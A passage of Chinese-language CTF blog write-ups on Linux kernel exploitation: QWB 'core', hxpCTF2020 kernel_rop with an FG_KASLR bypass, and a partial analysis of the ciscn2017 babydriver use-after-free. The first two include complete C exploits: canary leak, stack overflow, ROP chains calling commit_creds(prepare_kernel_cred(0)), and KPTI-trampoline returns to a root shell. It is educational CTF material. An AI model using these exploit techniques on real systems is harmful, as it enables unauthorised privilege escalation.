保护机制：常见的有kaslr（地址随机化），smep(内核态不可执行用户态的代码)，smap(内核态不可访问用户态的数据)。 解题过程：拿到这些文件后首先要做的就是解包.cpio文件，但不要在共享文件夹下进行此操作，会导致解包的软链接出错。我一般是这样： 1234567891011cp give_to_player /home/an9ela/kernelcd /home/an9ela/kernel/give_to_playermkdir coremv core.cpio core.cpio.gzmv core.cpio.gz ./corecd coregunzip core.cpio.gzcpio -idmv &lt; core.cpiow //解包操作find . | cpio -o --format=newc &gt; ../core.cpio //打包操作，这题给了gen_cpio.sh直接./gen_cpio core.cpio 得到文件系统之后首先要看的就是Init文件了，这个是初始化内核时所进行的操作“ 1234567891011121314151617181920212223#!/bin/shmount -t proc proc /procmount -t sysfs sysfs /sysmount -t devtmpfs none /dev/sbin/mdev -smkdir -p /dev/ptsmount -vt devpts -o gid=4,mode=620 none /dev/ptschmod 666 /dev/ptmxcat /proc/kallsyms &gt; /tmp/kallsyms //备份了kallsyms到tmp文件夹下echo 1 &gt; /proc/sys/kernel/kptr_restrict //即我们不能通过/proc/kallsyms获得函数地址，但/tmp/kallsyms是不受影响的echo 1 &gt; /proc/sys/kernel/dmesg_restrict //无法通过dmesg查看内核的输出ifconfig eth0 upudhcpc -i eth0ifconfig eth0 10.0.2.15 netmask 255.255.255.0route add default gw 10.0.2.2insmod /core.ko //插入core.ko模块，该模块也即我们要重点分析的模块poweroff -d 120 -f &amp; //这句设置了120s自动关机，为不影响调试可以删掉setsid /bin/cttyhack setuidgid 1000 /bin/sh //我们的shell的uidgid为1000，root为0echo 'sh end!\\n'umount /procumount /syspoweroff -d 0 -f 接下来就要分析core.ko模块了，可以用ida打开。首先查看init_module函数，该函数会在模块加载时执行。 123456__int64 init_module(){ core_proc = proc_create(&quot;core&quot;, 438LL, 0LL, &amp;core_fops); printk(&amp;unk_2DE); return 0LL;} 该函数调用proc_create创建了名为core的虚拟文件，应用层通过读写改文件实现与内核的交互。其中第三个参数file_operations存储了内核模块提供的对设备进行各种操作的函数指针，对于用户态而言也可以理解为我们可以通过core文件能进行那些操作。点进去fop 123.data:0000000000000438 dq offset core_write.data:0000000000000468 dq offset core_ioctl.data:0000000000000498 dq offset core_release 可见能执行的操作为write,ioctl,release 接下来是core_ioctl函数： 12345678910111213141516171819202122__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3){ __int64 v3; // rbx v3 = a3; switch ( a2 ) { case 0x6677889B: core_read(a3); break; case 0x6677889C: printk(&amp;unk_2CD); off = v3; break; case 0x6677889A: printk(&amp;unk_2B3); core_copy_func(v3); break; } return 0LL;} int ioctl(int fd, ind cmd, …);是设备驱动程序中对设备的io通道进行管理的函数。其中fd是用户程序打开设备时使用open函数返回的文件标识符，cmd是用户程序对设备的控制命令。ioctl是文件结构中的一个属性分量，如果你的驱动程序提供了对ioctl的支持，用户就可以在用户程序中使用ioctl函数实现对设备io通道的控制。意思就是如果lkm中提供了ioctl功能（比如上面的这个函数），并且实现了对应指令的操作，那么在用户态中，通过这个驱动程序，我们就可以调用ioctl函数来直接调用模块中的操作。 而这里就提供了ioctl功能，继续分析core_read()。 12345678910111213141516171819202122232425unsigned __int64 __fastcall core_read(__int64 a1){ __int64 v1; // rbx __int64 *v2; // rdi __int64 i; // rcx unsigned __int64 result; // rax __int64 v5; // [rsp+0h] [rbp-50h] unsigned __int64 v6; // [rsp+40h] [rbp-10h] v1 = a1; v6 = __readgsqword(0x28u); printk(&amp;unk_25B); printk(&amp;unk_275); v2 = &amp;v5; for ( i = 16LL; i; --i ) { *(_DWORD *)v2 = 0; v2 = (__int64 *)((char *)v2 + 4); } strcpy((char *)&amp;v5, &quot;Welcome to the QWB CTF challenge.\\n&quot;); result = copy_to_user(v1, (char *)&amp;v5 + off, 64LL); if ( !result ) return __readgsqword(0x28u) ^ v6; __asm { swapgs } return result; copy_to_user()函数中将v5+off中的0x40长度的数据拷贝到用户空间，其中off是bss上的全局变量。 而case 0x6677889C就给了我们控制off的机会，因此我们利用通过控制off=0x40来leak canary。 core_copy_func函数： 1234567891011121314151617181920 __int64 __fastcall core_copy_func(__int64 a1){ __int64 result; // rax __int64 v2; // [rsp+0h] [rbp-50h] unsigned __int64 v3; // [rsp+40h] [rbp-10h] v3 = __readgsqword(0x28u); printk(&amp;unk_215); if ( a1 &gt; 63 ) { printk(&amp;unk_2A1); result = 0xFFFFFFFFLL; } else { result = 0LL; qmemcpy(&amp;v2, &amp;name, (unsigned __int16)a1); } return result;}首先对长度进行了检查，但注意数据类型，a1为int64，而在qmemcpy函数里类型了uint16，因此我们设计a1为0xffffffff00000000|(real_len)使int64为负数，从而绕过检查的同时造成溢出。 这样分析下来利用思路就很明确了：先利用core_read()泄露canary，之后再利用core_cpoy_func在内核栈里构造rop，使其在内核态执行commit_creds(prepare_kernel_cred(0))使得进程的uidgid=0，然后返回到用户态执行system(“/bin/sh)从而完成提权。 难点在于rop的构造。对于执行commit_creds(prepare_kernel_cred(0))来说，传参和用户态的一致，但要注意commit_creds()的参数是prepare_kernel_cred(0)函数的返回值。从内核态返回用户态时要用到条指令swapgs和iretq。在执行iretq之前，执行swapgs指令。该指令通过用一个MSR中的值交换GS寄存器的内容，用来获取指向内核数据结构的指针，然后才能执行系统调用之类的内核空间程序。 iret(特权返回)指令从内核空间返回到用户空间进程。但是iret(64位下为iretq)期望的特定的堆栈布局如下所示： 12345678910111213|----------------------|| iretq_ret ||----------------------|| RIP |&lt;== low mem|----------------------|| CS ||----------------------|| EFLAGS ||----------------------|| RSP ||----------------------|| SS |&lt;== high mem|----------------------| 新的用户空间指令指针(RIP)，用户空间堆栈指针(RSP)，代码和堆栈段选择器(CS和SS)以及具有各种状态信息的EFLAGS寄存器。一般我们用以下的扩展内联汇编获得所需的寄存器的值： 1234567891011121314void save_status(){ asm( &quot; mov %%cs, %0\\n&quot; &quot;mov %%ss,%1\\n&quot; &quot;mov %%rsp,%3\\n&quot; &quot;pushfq\\n&quot; &quot;popq %2&quot; :&quot;=r&quot;(tf.cs),&quot;=r&quot;(tf.ss),&quot;=r&quot;(tf.rflags),&quot;=r&quot;(tf.rsp) //output : //input :&quot;memory&quot; //list of clobbered registers即改变的内容 ); tf.rsp -= 4096; tf.rip = &amp;launch_shell;} rop： 123456789101112131415161718192021222324252627282930313233343536pwndbg&gt; stack 5000:0000│ rsp 0xffffa47a800e7e60 —▸ 0x7ffec40e5570 ◂— add byte ptr [rcx - 0x70], dl /* 0x44777d3bde905100 */01:0008│ 0xffffa47a800e7e68 —▸ 0xffffffffb2200b2f ◂— pop rdi /* 0x722540358b4cc35f */02:0010│ 0xffffa47a800e7e70 ◂— 003:0018│ 0xffffa47a800e7e78 —▸ 0xffffffffb229cce0 ◂— push rbp /* 0x153d8b48fd894855 */04:0020│ 0xffffa47a800e7e80 —▸ 0xffffffffb2221e53 ◂— pop rcx /* 0xffdf89480127c359 */05:0028│ 0xffffa47a800e7e88 —▸ 0xffffffffb229c8e0 ◂— push r12 /* 0x4025248b4c655441 */06:0030│ 0xffffa47a800e7e90 —▸ 0xffffffffb23ae978 ◂— mov rdi, rax /* 0xc28ee9e1ffc78948 */07:0038│ 0xffffa47a800e7e98 —▸ 0xffffffffb2c012da ◂— swapgs /* 0x485590c39df8010f */08:0040│ 0xffffa47a800e7ea0 ◂— 009:0048│ 0xffffa47a800e7ea8 —▸ 0xffffffffb2250ac2 ◂— iretq /* 0x1f0f2e6690c3cf48 */0a:0050│ 0xffffa47a800e7eb0 —▸ 0x400eac ◂— push rbp0b:0058│ 0xffffa47a800e7eb8 ◂— 0x33 /* '3' */0c:0060│ 0xffffa47a800e7ec0 ◂— 0x2820d:0068│ 0xffffa47a800e7ec8 —▸ 0x7ffec40e45c0 ◂— 00e:0070│ 0xffffa47a800e7ed0 ◂— 0x2b /* '+' */0f:0078│ 0xffffa47a800e7ed8 ◂— 0*(ptr + i++) = canary;*(ptr + i++) = rbp;*(ptr + i++) = prdi_ret;*(ptr + i++) = 0;*(ptr + i++) = prepare_kernel_cred;*(ptr + i++) = prcx_ret;*(ptr + i++) = commit_creds;*(ptr + i++) = mov_rdi_rax_jmp_rcx;*(ptr + i++) = swapgs_p_ret;*(ptr + i++) = 0;*(ptr + i++) = iretq_ret;*(ptr + i++) = (uint64_t) launch_shell;*(ptr + i++) = tf.cs;*(ptr + i++) = tf.rflags;*(ptr + i++) = tf.rsp;*(ptr + i++) = tf.ss; exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;inttypes.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdbool.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;struct trap_frame{c void *rip; uint64_t cs; uint64_t rflags; void * rsp; uint64_t ss;}__attribute__((packed));struct trap_frame tf;uint64_t kernel_base=0;uint64_t commit_creds=0;uint64_t prepare_kernel_cred = 0;uint64_t commit_creds_offset = 0x9c8e0;uint64_t prepare_kernel_cred_offset = 0x9cce0;uint64_t canary = 0;uint64_t rbp = 0;uint64_t prdi_ret = 0x0b2f; //: pop rdi; ret;uint64_t mov_rdi_rax_jmp_rcx = 0x1ae978; //: mov rdi, rax; jmp rcx;uint64_t mov_rdi_rax_jmp_rdx = 0x6a6d2; //: mov rdi, rax; jmp rdx;uint64_t prcx_ret = 0x21e53; //: pop rcx; ret;uint64_t swapgs_p_ret = 0xa012da; //: swapgs; popfq; ret;uint64_t iretq_ret = 0x50ac2; //: iretq; ret;bool get_kernel_base(){ FILE *fd; uint64_t kernel_base1=0,kernel_base2=0; fd=fopen(&quot;/tmp/kallsyms&quot;,&quot;rb&quot;); char line[0x30]; if(fd&lt;0){ die(&quot;open kallsyms fialed&quot;); } while(1){ fgets(line,0x30,fd); if(kernel_base!=0){ return true; } if(strstr(line,&quot;commit_creds&quot;)&amp;&amp;!commit_creds){ getchar(); sscanf(line,&quot;%llx&quot;,&amp;commit_creds); printf(&quot;commit_creds addr: %p\\n&quot;,commit_creds); kernel_base1=commit_creds-commit_creds_offset; } if(strstr(line,&quot;prepare_kernel_cred&quot;)&amp;&amp;!prepare_kernel_cred){ getchar(); sscanf(line,&quot;%llx&quot;,&amp;prepare_kernel_cred); printf(&quot;prepare_kernel_cred addr: %p\\n&quot;,prepare_kernel_cred); kernel_base2=prepare_kernel_cred-prepare_kernel_cred_offset; } if(kernel_base1!=0&amp;&amp;kernel_base1==kernel_base2){ kernel_base=kernel_base1; } }}void leak(int fd){ ioctl(fd,0x6677889C,0x40); uint8_t buffer[0x40]; ioctl(fd,0x6677889B,buffer); canary=*(uint64_t *)buffer; rbp=*(uint64_t *)(buffer+8); printf(&quot;canary: %p\\n&quot;,canary);}void set_gadget_addr(){ prdi_ret += kernel_base; prcx_ret += kernel_base; mov_rdi_rax_jmp_rcx += kernel_base; mov_rdi_rax_jmp_rdx += kernel_base; swapgs_p_ret += kernel_base; iretq_ret += kernel_base; return ;}void launch_shell();void save_status(){ asm( &quot; mov %%cs, %0\\n&quot; &quot;mov %%ss,%1\\n&quot; &quot;mov %%rsp,%3\\n&quot; &quot;pushfq\\n&quot; &quot;popq %2&quot; :&quot;=r&quot;(tf.cs),&quot;=r&quot;(tf.ss),&quot;=r&quot;(tf.rflags),&quot;=r&quot;(tf.rsp) : :&quot;memory&quot; ); tf.rsp -= 4096; tf.rip = &amp;launch_shell;}void launch_shell(){ execl(&quot;/bin/sh&quot;,&quot;sh&quot;,NULL);}int main(){ bool ret = get_kernel_base(); int i = 0; uint8_t buffer[0x800] = {0}; int fd = open(&quot;/proc/core&quot;,O_RDWR); leak(fd); set_gadget_addr(); save_status(); uint64_t *ptr; ptr = (uint64_t *)(buffer+0x40); *(ptr + i++) = canary; *(ptr + i++) = rbp; *(ptr + i++) = prdi_ret; *(ptr + i++) = 0; *(ptr + i++) = prepare_kernel_cred; *(ptr + i++) = prcx_ret; *(ptr + i++) = commit_creds; *(ptr + i++) = mov_rdi_rax_jmp_rcx; *(ptr + i++) = swapgs_p_ret; *(ptr + i++) = 0; *(ptr + i++) = iretq_ret; *(ptr + i++) = (uint64_t) launch_shell; *(ptr + i++) = tf.cs; *(ptr + i++) = tf.rflags; *(ptr + i++) = tf.rsp; *(ptr + i++) = tf.ss; write(fd,buffer,0x800); uint64_t len=0xffffffff00000000; uint32_t l=0x100; len|=l; ioctl(fd,0x6677889A,len); return 0;} 一点补充：静态编译exp(内核没有c库):gcc exp.c -static -o exploit 查找gadget指令：ROPgadget --binary vmlinux &gt; ropgadget 调试方法：.sh脚本里有-s我们可以通过 123gdb ./vmlinuxtarget remote:1234add-symbol-file core.ko 0xffffffffc0000000 (该text的基地址通过cat /sys/module/core/sections/.text得到) 这样就可以直接根据模块里的函数名下断了。 但又一点很疑惑的时pwngdb调内核空间巨卡，而且si/ni直接跑飞了🤦，只能下断点再c这样调，ruan师傅说gef调起来很快，得再去搞个gef来。 参考博客（感谢）：https://f5.pm/go-26809.htmlhttps://www.cnblogs.com/T1e9u/p/13805760.htmlhttps://www.freebuf.com/articles/system/227357.html","link":"/2020/11/07/kernel_pwn(1)/"},{"title":"Kernel_pwn FG_KASLR in ROP","text":"Kernel_pwn FG_KASLR in ROP 第一次遇到FG_KASLR机制，算是KASLR的加强版，加大了一些ROP的难度，但仍有bypass的方法。题目来自hxpCTF2020 kernel_rop。 FG_KASLR首先了解下FG_KASLR：全称是Function Granular KASLR，译为函数颗粒化地址随机分布。我们知道，开启一般的KASLR会使得每次目标文件加载到的内存起始地址会随机化，但只要能leak一个在相应内存区域的地址，我们就能通过其offset固定的原因得到任何一个在此内存区域的地址。 文档对FG_KASLR描述为: 1234This patch set is an implementation of finer grained kernel address spacerandomization. It rearranges your kernel code at load time on a per-function level granularity, with only around a second added toboot time. 和KASLR不同，FG_KASLR做了更随机化。它在load的时候按照函数级别的细粒度来重排内核代码，这样做它的boot time增加了1秒，但使得我们通过offset的方法得到真实地址的方法”破灭“。即使我们leak出了一个在.text段的地址，但FG_KASLR是函数级上的随机化，对函数的重排使得offset也变得随机化，我们也就无法通过leak_addr+offset来确定地址了。 这是我一开始看到这个机制的想法，但当我做到一道开了FG_KASLR的kernel_pwn之后，才发现我too yuang too simple了。 hxpCTF2020 kernel_rop拿到题目后发现内核版本为vmlinuz: Linux kernel x86 boot executable bzImage, version 5.9.0-rc6+算是比较新了。 接着查看etc/init.d/里的rcS初始化脚本看到insmod了hackme.ko，应该就是有漏洞的模块了。 模块提供了hackme_read()和hackme_write()功能，漏洞在write功能里： 123456789101112131415161718192021ssize_t __fastcall hackme_write(file *f, const char *data, size_t size, loff_t *off){ unsigned __int64 v4; // rdx ssize_t v5; // rbx int tmp[32]; // [rsp+0h] [rbp-A0h] BYREF unsigned __int64 v8; // [rsp+80h] [rbp-20h] _fentry__(); v5 = v4; v8 = __readgsqword(0x28u); if ( v4 &gt; 0x1000 ) { _warn_printk(&quot;Buffer overflow detected (%d &lt; %lu)!\\n&quot;, 4096LL); BUG(); } _check_object_size(hackme_buf, v4, 0LL); if ( copy_from_user(hackme_buf, data, v5) ) return -14LL; _memcpy(tmp, hackme_buf, v5); return v5;} _memcpy(tmp, hackme_buf, v5);造成栈溢出。因此利用方法就比较明确了，先利用read功能leak地址，找gadgets，之后rop执行commit_creds(prepare_kernel_cred(0))提权。 首先leak地址： 1read(global_fd, leak, sizeof(leak)); 传入一个leak数组，看下都读到了啥： 123456789101112131415161718192021222324252627282930313233343536373839400: 0xffff888007201020 1: 0xfe02: 0x71e8e82fd1c6c6003: 0xffff88800647b2104: 0xffffc900001c7e685: 0x46: 0xffff88800647b2007: 0xffffc900001c7ef08: 0xffff88800647b2009: 0xffffc900001c7e8010: 0xffffffff8184e04711: 0xffffffff8184e04712: 0xffff88800647b20013: (nil)14: 0x7fff6f10583015: 0xffffc900001c7ea016: 0x71e8e82fd1c6c60017: 0x14018: (nil)19: 0xffffc900001c7ed820: 0xffffffff816d51ff21: 0xffff88800647b20022: 0xffff88800647b20023: 0x7fff6f10583024: 0x14025: (nil)26: 0xffffc900001c7f2027: 0xffffffff816d572728: 0xffffffff8152b8a129: (nil)30: 0x71e8e82fd1c6c60031: 0xffffc900001c7f5832: (nil)33: (nil)34: (nil)35: 0xffffc900001c7f3036: 0xffffffff816d577a37: 0xffffc900001c7f4838: 0xffffffff8100a15739: (nil) 多重复leak几次后会发现leak[38]处的0xffffffff8100a157是没变化的，而且这个地址是kernel image里的地址，因此通过这个地址我们容易得到image_base的地址。接着我们先手动root下，通过/proc/kallsyms去找找函数地址 123456789101112131415161738: 0xffffffffa820a157 39: (nil) image base: 0xffffffffa8200000/ # cat /proc/kallsyms | grep &quot;commit_creds&quot;ffffffffa8c93f90 T commit_credsffffffffa9187d90 r __ksymtab_commit_credsffffffffa91a0972 r __kstrtab_commit_credsffffffffa91a4d42 r __kstrtabns_commit_creds38: 0xffffffffb260a15739: (nil)image base: 0xffffffffb2600000/ # cat /proc/kallsyms | grep &quot;commit_creds&quot;ffffffffb2a2e6c0 T commit_credsffffffffb3587d90 r __ksymtab_commit_credsffffffffb35a0972 r __kstrtab_commit_credsffffffffb35a4d42 r __kstrtabns_commit_creds 上面是两次启动qemu后先leak地址在通过/proc/kallsyms查看函数地址得到的结果。commit_creds函数和image_base的offset分别为0xa93f90和0x42e6c0，可以看到，我们无法通过image_base+offset来得到commit_creds()的地址，这也是开启了FG_KASLR的效果。 但在计算__ksymtab_commit_creds和image_base的偏移时发现： 1234&gt;&gt;&gt; hex(0xffffffffa9187d90-0xffffffffa8200000)'0xf87d90L'&gt;&gt;&gt; hex(0xffffffffb3587d90-0xffffffffb2600000)'0xf87d90L' offset是固定的。可以看到，FG_KASLR并没有做到Kernel地址的完全随机化，没有受到影响的区域如下： 1、存在于.text_base到__x86_retpoline_r15(.text+400dc6)的函数没有受到影响。显然commit_creds和prepare_kernel_cred()没有包含在内，但我们还是可以在这里找一些gadget的。 2、KPIT trampolineswapgs_restore_regs_and_return_to_usermode()没有受到影响。 3.内核符号表(kernel symbol table)ksymtab开始于.text+0xf85198没有受到影响。 这也说明了我们计算__ksymtab_commit_creds的偏移固定的原因。ksymtab的结构如下 12345struct kernel_symbol { int value_offset; int name_offset; int namespace_offset;}; 其中value_offset是ksymtab到对应函数的偏移，以commit_creds函数为例就是__ksymtab_commit_creds + value_offset = commit_creds。 使用到的gadgets有： 123pop_rax_ret = image_base + 0x4d11;mov_eax_ind_rax_ret = image_base + 0x4aae;pop_rdi_ret = image_base + 0x38a0; 思路如下： 1、通过read功能leak出image_base和stack里的cookie，分别对应leak[38]和leak[2]。 2、通过image_base+offset计算__ksymtab_commit_creds，__ksymtab_prepare_kernel_cred()以及gadgets地址。 3、构造ROP，利用gadget将ksymtab的value_offset存放rax，再利用KPTI trampoline返回userland得到其值，计算得真实函数地址，再做一次类似的ROP从而得到commit_creds()和prepare_kernel_cred()函数地址。 4、由于有KPTI而且我们的gadget里没有能类似mov rdi, rax的功能，只能分解利用的过程。我们的ROP应使用KPTI trampoline将提权分成两个stage：1.ROP执行prepare_kernel_cred(0),执行结果于rax，利用KPTI trampoline返回userland得到rax值(即cred_struct_va)。2.ROP执行commit_cred(cred_struct_va)，利用KPTI trampoline返回userland执行system('/bin/sh');。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;sched.h&gt;#include &lt;sys/mman.h&gt;#include &lt;signal.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;sys/wait.h&gt;#include &lt;poll.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;inttypes.h&gt;uint64_t user_cs, user_ss, user_rflags, user_sp;int global_fd;char flag_buf[256];uint64_t cookie;uint64_t image_base;uint64_t swapgs_restore_regs_and_ret_to_uspace; // start after popping raxuint64_t zero_rax_ret; // xor eax, eax; ret;uint64_t write_mem_ret; // mov qword ptr [rbx], rax; pop rbx; pop rbp; ret;uint64_t pop_rax_ret; // pop rax; retuint64_t mov_eax_ind_rax_ret; // mov eax, qword ptr [rax + 0x10]; pop rbp; ret;uint64_t pop_rdi_ret; // pop rdi; pop rbp; ret;uint64_t ksymtab_prepare_kernel_cred;uint64_t ksymtab_commit_creds;uint64_t prepare_kernel_cred;uint64_t commit_creds;uint64_t creds_struct_va;enum current_state{ current_state_read_ksymtab_prepare_kernel_cred, current_state_read_ksymtab_commit_creds, current_state_escalate_privileges_stage1, current_state_escalate_privileges_stage2,};void safe_exit(void);int open_dev(){ int fd = open(&quot;/dev/hackme&quot;, O_RDWR); if(fd &lt; 0){ printf(&quot;open faild!&quot;); exit(1); } return fd;}void save_state(void){ asm( &quot;movq %%cs, %0\\n&quot; &quot;movq %%ss, %1\\n&quot; &quot;movq %%rsp, %3;\\n&quot; &quot;pushfq\\n&quot; &quot;pop %2\\n&quot; : &quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_rflags), &quot;=r&quot;(user_sp) : : &quot;memory&quot;); printf(&quot;%lx %lx %lx %lx\\n&quot;, user_cs, user_ss, user_rflags, user_sp);}void print_leak(uint64_t leak[], int n){ for(int i = 0 ; i &lt; n ; i++){ printf(&quot;%d: %p\\n&quot;,i ,leak[i]); }}void get_gadget_offset(){ int n = 40; uint64_t leak[n]; read(global_fd, leak, sizeof(leak)); cookie = leak[2]; image_base = leak[38] - 0xa157; swapgs_restore_regs_and_ret_to_uspace = image_base + 0x200f10 + 19; zero_rax_ret = image_base + 0x3b91; pop_rax_ret = image_base + 0x4d11; mov_eax_ind_rax_ret = image_base + 0x4aae; pop_rdi_ret = image_base + 0x38a0; ksymtab_prepare_kernel_cred = image_base + 0xf8d4fcUL; ksymtab_commit_creds = image_base + 0xf87d90UL; print_leak(leak, n); printf(&quot;cookie: %p\\n&quot;, cookie); printf(&quot;image base: %p\\n&quot;, image_base);}enum current_state global_cstate;void read_address(){ int write_n = 50; int i = 16; uint64_t rop[write_n]; rop[i++] = cookie; rop[i++] = 0; // rbx rop[i++] = 0x1; // r12 rop[i++] = 0x20000000; // rbp rop[i++] = pop_rax_ret; if(global_cstate == current_state_read_ksymtab_prepare_kernel_cred){ rop[i++] = ksymtab_prepare_kernel_cred - 0x10; } else if(global_cstate == current_state_read_ksymtab_commit_creds){ rop[i++] = ksymtab_commit_creds - 0x10; } else{ printf(&quot;state error&quot;); exit(-1); } rop[i++] = mov_eax_ind_rax_ret; rop[i++] = user_sp; // pop rbp rop[i++] = swapgs_restore_regs_and_ret_to_uspace; rop[i++] = 0xccdd; rop[i++] = 0x33333; rop[i++] = 0x666666; rop[i++] = 0x666666; rop[i++] = 0x666666; rop[i++] = (uint64_t)safe_exit; //rip rop[i++] = user_cs; rop[i++] = user_rflags; rop[i++] = user_sp; rop[i++] = user_ss; write(global_fd, rop, sizeof(rop)); // Should never be reached exit(-1);}void escalate_privileges(){ int write_n = 50; uint64_t rop[write_n]; int i = 16; rop[i++] = cookie; rop[i++] = 0x0; // rbx rop[i++] = 0x1; // r12 rop[i++] = 0x20000000; // rbp if (global_cstate == current_state_escalate_privileges_stage1){ rop[i++] = pop_rdi_ret; rop[i++] = 0; // rdi rop[i++] = user_sp; // rbp rop[i++] = prepare_kernel_cred; } else if(global_cstate == current_state_escalate_privileges_stage2){ rop[i++] = pop_rdi_ret; rop[i++] = creds_struct_va; // rdi rop[i++] = user_sp; // rbp rop[i++] = commit_creds; } rop[i++] = swapgs_restore_regs_and_ret_to_uspace; rop[i++] = 0xccdd; rop[i++] = 0x33333; rop[i++] = 0x666666; rop[i++] = 0x666666; rop[i++] = 0x666666; rop[i++] = (uint64_t)safe_exit; rop[i++] = user_cs; rop[i++] = user_rflags; rop[i++] = user_sp; rop[i++] = user_ss; write(global_fd, rop, sizeof(rop)); // Should never be reached exit(-1);}void safe_exit(){ uint64_t rax; uint64_t rbp; asm volatile( &quot;mov %%rax, %0\\n\\t&quot; : &quot;=r&quot;(rax), &quot;=r&quot;(rbp) ); printf(&quot;returned from kernel: %lx\\n&quot;, rax); if(global_cstate == current_state_read_ksymtab_prepare_kernel_cred){ prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)rax; global_cstate = current_state_read_ksymtab_commit_creds; read_address(); } else if(global_cstate == current_state_read_ksymtab_commit_creds){ commit_creds = ksymtab_commit_creds + (int)rax; printf(&quot;prepare_kernel_cred: 0x%lx\\n&quot;, prepare_kernel_cred); printf(&quot;commit_creds : 0x%lx\\n&quot;, commit_creds); global_cstate = current_state_escalate_privileges_stage1; escalate_privileges(); } else if(global_cstate == current_state_escalate_privileges_stage1){ creds_struct_va = rax; printf(&quot;creds_struct_va: 0x%lx\\n&quot;, creds_struct_va); global_cstate = current_state_escalate_privileges_stage2; escalate_privileges(); } else if(global_cstate == current_state_escalate_privileges_stage2){ if(getuid() == 0){ printf(&quot;Flag: \\n&quot;); FILE *f = fopen(&quot;/dev/sda&quot;, &quot;r&quot;); fread(flag_buf, 1, sizeof(flag_buf), f); puts(flag_buf); system(&quot;/bin/sh&quot;); } else{ printf(&quot;not root yet\\n&quot;); exit(-1); } }}int main(){ save_state(); global_fd = open_dev(); get_gadget_offset(); global_cstate = current_state_read_ksymtab_prepare_kernel_cred; read_address(); return 0;} 参考：https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/","link":"/2021/02/10/kernel_pwn(fg_kaslr)/"},{"title":"kernel_pwn UAF","text":"kernel_pwn UAF 内核的UAF和用户态的差不多，不同的是内核使用的是slab/slub分配器来管理堆块。题目来源：ciscn2017_babydriver 查看启动脚本： 12#!/bin/bashqemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic -smp cores=1,threads=1 -cpu kvm64,+smep 开启了smep保护（内核态不可执行用户态的代码）。查看init： 123456789101112131415161718#!/bin/shmount -t proc none /procmount -t sysfs none /sysmount -t devtmpfs devtmpfs /devchown root:root flagchmod 400 flagexec 0&lt;/dev/consoleexec 1&gt;/dev/consoleexec 2&gt;/dev/consoleinsmod /lib/modules/4.4.72/babydriver.kochmod 777 /dev/babydevecho -e &quot;\\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\\n&quot;setsid cttyhack setuidgid 1000 shumount /prockumount /syspoweroff -d 0 -f 看到加载了babydriver.ko模块，也就是存在漏洞的lkm了，ida打开开始干活：关键函数babyopen(): 12345678910int __fastcall babyopen(inode *inode, file *filp){ __int64 v2; // rdx _fentry__(inode, filp); babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 64LL); babydev_struct.device_buf_len = 0x40LL; printk(&quot;device open\\n&quot;, 0x24000C0LL, v2); return 0;} 首先看到全局的结构体babydev_struct有两个成员： 1234567babydevice_t struc ; (sizeof=0x10, align=0x8, copyof_429)00000000 ; XREF: .bss:babydev_struct/r00000000 device_buf dq ? ; XREF: babyrelease+6/r00000000 ; babyopen+26/w ... ; offset00000008 device_buf_len dq ? ; XREF: babyopen+2D/w00000008 ; babyioctl+3C/w ...00000010 babydevice_t ends 每当打开一个设备时，都会通过kmalloc申请大小为0x40的内存其ptr赋给device_buf,0x40给到device_buf_len。由于它是定义在全局的结构体，我们每次open都会更新该struct的内容。接下来baby_ioctl(): 123456789101112131415161718192021222324__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg){ size_t v3; // rdx size_t v4; // rbx __int64 v5; // rdx __int64 result; // rax _fentry__(filp, *(_QWORD *)&amp;command); v4 = v3; if ( command == 0x10001 ) { kfree(babydev_struct.device_buf); babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL); babydev_struct.device_buf_len = v4; printk(&quot;alloc done\\n&quot;, 0x24000C0LL, v5); result = 0LL; } else { printk(&amp;unk_2EB, v3, v3); result = -22LL; } return result;} 先kfree掉struct里device_buf指向的内存，之后kamlloc大小可控的内存并更新结构体。baby_write(): 123456789101112131415161718ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset){ size_t v4; // rdx ssize_t result; // rax ssize_t v6; // rbx _fentry__(filp, buffer); if ( !babydev_struct.device_buf ) return -1LL; result = -2LL; if ( babydev_struct.device_buf_len &gt; v4 ) { v6 = v4; copy_from_user(); result = v6; } return result;} 可以向结构体里的device_buf写入内容。 baby_release(): 123456789int __fastcall babyrelease(inode *inode, file *filp){ __int64 v2; // rdx _fentry__(inode, filp); kfree(babydev_struct.device_buf); printk(&quot;device release\\n&quot;, filp, v2); return 0;} kfree掉device_buf，但没置0。 分析完我们可以发现问题就在于我们无论是什么操作都是基于这个babydev_struct结构体，但这个结构体是全局的，如果我们open两次的话第一次kmalloc的ptr就会被第二次kmalloc的ptr覆盖，也就是说我们无论是对fd1进行操作还是对fd2进行操作将会是同一块内存，如果close(fd1)而对fd2进行操作就可实现UAF的效果。 